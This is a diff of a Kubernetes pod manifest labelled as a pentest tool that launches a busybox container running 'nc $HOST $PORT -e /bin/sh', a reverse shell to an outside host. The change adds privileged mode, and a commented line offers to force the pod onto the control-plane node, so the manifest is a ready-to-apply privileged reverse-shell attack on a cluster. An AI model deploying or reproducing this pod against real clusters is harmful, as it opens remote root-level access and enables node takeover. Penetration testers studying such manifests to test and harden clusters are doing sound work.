@@ -1,20 +1,22 @@
 ###########################################################
-## Deploy: kubectl -n [namespace] apply -f pod-hostnetwork-only.yaml 
-## Access: kubectl -n [namespace] exec -it pod-hostnetwork -- bash
-## Remove: kubectl -n [namespace] delete -f pod-hostnetwork-only.yaml
+## Deploy: kubectl -n [namespace] apply -f pod-priv-revshell.yaml 
+## Access: kubectl -n [namespace] exec -it pod-priv-revshell -- bash
+## Remove: kubectl -n [namespace] delete pod-priv-revshell
 ###########################################################
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-hostnetwork-revshell
-  labels:
+  name: pod-priv-revshell
+  labels: 
     app: pentest
 spec:
-  hostNetwork: true
   containers:
-  - image: busybox
+  - name: priv-revshell
+    image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-    name: hostnetwork-revshell
+
+    securityContext:
+      privileged: true
   # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
   #nodeName: k8s-control-plane-node
